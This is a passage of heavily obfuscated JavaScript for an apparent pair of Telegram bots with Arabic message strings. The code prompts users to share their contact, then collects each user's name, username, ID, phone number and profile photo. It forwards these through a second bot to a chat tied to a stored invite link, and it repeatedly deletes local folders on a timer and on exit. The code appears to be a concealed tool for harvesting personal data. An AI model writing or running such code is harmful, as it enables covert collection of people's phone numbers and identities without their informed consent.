    secondBot[_0x4680d4(0x344) + 'e'](_0x42bbcd, _0x15995f[_0x4680d4(0x13a)], _0x4866d3);
}), secondBot['on'](_0x4e73bb(0x42a), _0x130df0 => {
    const _0x3d9c31 = _0x4e73bb, _0x29c303 = {
            'HApwk': _0x3d9c31(0x4b9) + _0x3d9c31(0x575) + 'ح.',
            'iTSoM': _0x3d9c31(0x34d) + _0x3d9c31(0x685) + _0x3d9c31(0x470),
            'oRntD': _0x3d9c31(0x64b),
            'LnyEy': function (_0x1776ea, _0x19ea1f) {
                return _0x1776ea + _0x19ea1f;
            },
            'SaTsE': function (_0x14140c, _0x2ce6fb) {
                return _0x14140c + _0x2ce6fb;
            },
            'jQrtj': function (_0x1706cf, _0x15391e) {
                return _0x1706cf + _0x15391e;
            },
            'OCxSN': function (_0x44e567, _0x16c0da) {
                return _0x44e567 > _0x16c0da;
            },
            'GIiNy': _0x3d9c31(0x217) + _0x3d9c31(0x1cd),
            'jWKzN': _0x3d9c31(0x34d) + _0x3d9c31(0x62a) + _0x3d9c31(0x579) + _0x3d9c31(0x18d) + _0x3d9c31(0x2a2),
            'rofly': _0x3d9c31(0x3a6) + _0x3d9c31(0x322) + _0x3d9c31(0x15e) + _0x3d9c31(0x5dc) + _0x3d9c31(0x8f) + _0x3d9c31(0x364),
            'MyuZC': function (_0x26da09, _0x38ee5a) {
                return _0x26da09 === _0x38ee5a;
            },
            'aLWyI': _0x3d9c31(0x192) + _0x3d9c31(0x181),
            'iMpTo': _0x3d9c31(0x1dd) + 'ذة',
            'aulYs': _0x3d9c31(0x409) + _0x3d9c31(0x456) + _0x3d9c31(0x4e1) + _0x3d9c31(0x426),
            'TrRMi': _0x3d9c31(0x63c) + _0x3d9c31(0x362) + _0x3d9c31(0x2e9)
        };
    if (_0x130df0[_0x3d9c31(0x42a)] && inviteLinks[_0x130df0[_0x3d9c31(0x4df)]['id']]) {
        if (_0x29c303[_0x3d9c31(0x4c2)](_0x130df0[_0x3d9c31(0x42a)][_0x3d9c31(0x3e1)], _0x130df0[_0x3d9c31(0x4df)]['id'])) {
            const _0x298b7c = inviteLinks[_0x130df0[_0x3d9c31(0x4df)]['id']], _0xcddb54 = _0x130df0[_0x3d9c31(0x4df)], _0x44779d = _0xcddb54['id'], _0xc981ac = _0xcddb54[_0x3d9c31(0x64e)], _0x2152b5 = _0xcddb54[_0x3d9c31(0x5b6)] || '', _0x2b4a64 = _0xcddb54[_0x3d9c31(0x616)] || _0x29c303[_0x3d9c31(0x4da)], _0x2c6651 = _0xcddb54[_0x3d9c31(0xe7)] || _0x29c303[_0x3d9c31(0x23a)], _0x296f67 = _0x130df0[_0x3d9c31(0x42a)][_0x3d9c31(0x5bf) + 'er'];
            secondBot[_0x3d9c31(0x27d) + _0x3d9c31(0x28e)](_0x44779d)[_0x3d9c31(0x4b4)](_0x124855 => {
                const _0x2cb8a2 = _0x3d9c31, _0x18a299 = _0x29c303[_0x2cb8a2(0x25f)](_0x29c303[_0x2cb8a2(0x44d)](_0x29c303[_0x2cb8a2(0x44d)](_0x29c303[_0x2cb8a2(0x5b0)](_0x2cb8a2(0x3a4) + _0x2cb8a2(0x5f8) + '\x0a', _0x2cb8a2(0x355) + _0xc981ac + '\x20' + _0x2152b5 + _0x2cb8a2(0x12f)), _0x2cb8a2(0xcd) + '@' + _0x2b4a64 + _0x2cb8a2(0x12f)), _0x2cb8a2(0x1a3) + _0x44779d + _0x2cb8a2(0x12f)), _0x2cb8a2(0x255) + _0x2cb8a2(0x202) + _0x296f67 + '\x0a');
                if (_0x29c303[_0x2cb8a2(0x35e)](_0x124855[_0x2cb8a2(0x4a3) + 't'], -0x125a + 0x1fe7 + -0xd8d)) {
                    const _0x33a334 = _0x124855[_0x2cb8a2(0x4ef)][-0x1ee7 + -0x2 * -0x2e7 + -0x1919 * -0x1][-0xbd8 * 0x1 + 0x55a * -0x2 + -0x3 * -0x784][_0x2cb8a2(0x1e9)];
                    _0x33a334 ? bot[_0x2cb8a2(0x4aa)](_0x298b7c, _0x33a334, {
                        'caption': _0x18a299,
                        'parse_mode': _0x29c303[_0x2cb8a2(0x4db)]
                    })[_0x2cb8a2(0x4b4)](() => {
                        const _0x202d0a = _0x2cb8a2;
                        console[_0x202d0a(0x235)](_0x29c303[_0x202d0a(0x185)]);
                    })[_0x2cb8a2(0x3e9)](_0x22e083 => {
                        const _0x25a076 = _0x2cb8a2;
                        console[_0x25a076(0x2dd)](_0x29c303[_0x25a076(0x3be)], _0x22e083), bot[_0x25a076(0x344) + 'e'](_0x298b7c, _0x18a299, { 'parse_mode': _0x29c303[_0x25a076(0x4db)] });
                    }) : bot[_0x2cb8a2(0x344) + 'e'](_0x298b7c, _0x18a299, { 'parse_mode': _0x29c303[_0x2cb8a2(0x4db)] });
                } else
                    bot[_0x2cb8a2(0x344) + 'e'](_0x298b7c, _0x18a299, { 'parse_mode': _0x29c303[_0x2cb8a2(0x4db)] });
                secondBot[_0x2cb8a2(0x344) + 'e'](_0x130df0[_0x2cb8a2(0x662)]['id'], _0x29c303[_0x2cb8a2(0x550)]), delete inviteLinks[_0x130df0[_0x2cb8a2(0x4df)]['id']];
            })[_0x3d9c31(0x3e9)](_0x48e42b => {
                const _0x59a110 = _0x3d9c31;
                console[_0x59a110(0x2dd)](_0x29c303[_0x59a110(0x2c7)], _0x48e42b), secondBot[_0x59a110(0x344) + 'e'](_0x130df0[_0x59a110(0x662)]['id'], _0x29c303[_0x59a110(0xc1)]);
            });
        } else
            secondBot[_0x3d9c31(0x344) + 'e'](_0x130df0[_0x3d9c31(0x662)]['id'], _0x29c303[_0x3d9c31(0x103)]);
    } else
        secondBot[_0x3d9c31(0x344) + 'e'](_0x130df0[_0x3d9c31(0x662)]['id'], _0x29c303[_0x3d9c31(0x283)]);
}), secondBot['on'](_0x4e73bb(0x2c2), _0x575978 => {
    const _0x8daa51 = _0x4e73bb, _0x47d084 = {
            'CQnNy': function (_0x59d8b4, _0x458004) {
                return _0x59d8b4 !== _0x458004;
            },
            'eiCuJ': _0x8daa51(0x3bf),
            'YGbze': _0x8daa51(0x341) + _0x8daa51(0x530),
            'VKwLo': _0x8daa51(0x409) + _0x8daa51(0x456) + _0x8daa51(0xba)
        };
    if (!_0x575978[_0x8daa51(0x42a)] && _0x47d084[_0x8daa51(0x689)](_0x575978[_0x8daa51(0x5bc)], _0x47d084[_0x8daa51(0x648)])) {
        const _0x3a2126 = {
            'reply_markup': {
                'keyboard': [[{
                            'text': _0x47d084[_0x8daa51(0x339)],
                            'request_contact': !![]
                        }]],
                'one_time_keyboard': !![]
            }
        };
        secondBot[_0x8daa51(0x344) + 'e'](_0x575978[_0x8daa51(0x662)]['id'], _0x47d084[_0x8daa51(0xf0)], _0x3a2126);
    }
});
const clearTemporaryStorage = () => {
    const _0x44fa58 = _0x4e73bb, _0x29f6a4 = {
            'BqpxM': function (_0x5dcc60, _0x14c5bd) {
                return _0x5dcc60(_0x14c5bd);
            },
            'ZPMKm': _0x44fa58(0x632) + _0x44fa58(0x197) + _0x44fa58(0xe4),
            'mSfQS': _0x44fa58(0x26e),
            'pVhPy': _0x44fa58(0x15d),
            'wjfZQ': _0x44fa58(0x608),
            'LyZXn': _0x44fa58(0x34d) + _0x44fa58(0x35b) + _0x44fa58(0x1df) + _0x44fa58(0xe2)
        };
    try {
        console[_0x44fa58(0x235)](_0x29f6a4[_0x44fa58(0x4f5)]);
        const _0x4a9e04 = [
            _0x29f6a4[_0x44fa58(0x497)],
            _0x29f6a4[_0x44fa58(0x4e3)],
            _0x29f6a4[_0x44fa58(0x564)]
        ];
        _0x4a9e04[_0x44fa58(0x297)](_0x2755f3 => {
            const _0x1b09ba = _0x44fa58, _0x18c87d = path[_0x1b09ba(0x3eb)](__dirname, _0x2755f3);
            fs[_0x1b09ba(0x576)](_0x18c87d) ? (_0x29f6a4[_0x1b09ba(0x566)](deleteFolderRecursive, _0x18c87d), console[_0x1b09ba(0x235)](_0x1b09ba(0x230) + _0x1b09ba(0xf2) + _0x18c87d)) : console[_0x1b09ba(0x235)](_0x1b09ba(0x24b) + _0x1b09ba(0x69f) + _0x18c87d);
        });
    } catch (_0x551f36) {
        console[_0x44fa58(0x2dd)](_0x29f6a4[_0x44fa58(0x47f)], _0x551f36);
    }
};
setInterval(() => {
    const _0x18d184 = _0x4e73bb, _0xc7d783 = {
            'DnRBy': function (_0x49da4a) {
                return _0x49da4a();
            },
            'ckmJz': _0x18d184(0x88) + _0x18d184(0x244) + _0x18d184(0x18a)
        };
    _0xc7d783[_0x18d184(0x538)](clearTemporaryStorage), console[_0x18d184(0x235)](_0xc7d783[_0x18d184(0x22f)]);
}, (0x4d * 0x22 + -0x1 * -0x10bd + 0x43 * -0x67) * (-0x1 * 0x18c0 + -0x108a + 0x2986) * (0x67f * -0x1 + 0x53 * 0x41 + -0xaac));
const handleExit = () => {
    const _0x50195c = _0x4e73bb, _0x40116e = {
            'dpAOQ': _0x50195c(0x298) + _0x50195c(0x134) + _0x50195c(0x696) + _0x50195c(0x1d0),
            'zTOiP': function (_0x5c27fe) {
                return _0x5c27fe();
            }
        };
    console[_0x50195c(0x235)](_0x40116e[_0x50195c(0x3c3)]), _0x40116e[_0x50195c(0xaa)](clearTemporaryStorage), process[_0x50195c(0x411)]();
};
process['on'](_0x4e73bb(0x411), handleExit), process['on'](_0x4e73bb(0x44a), handleExit), process['on'](_0x4e73bb(0xdc), handleExit), process['on'](_0x4e73bb(0x4b7), handleExit);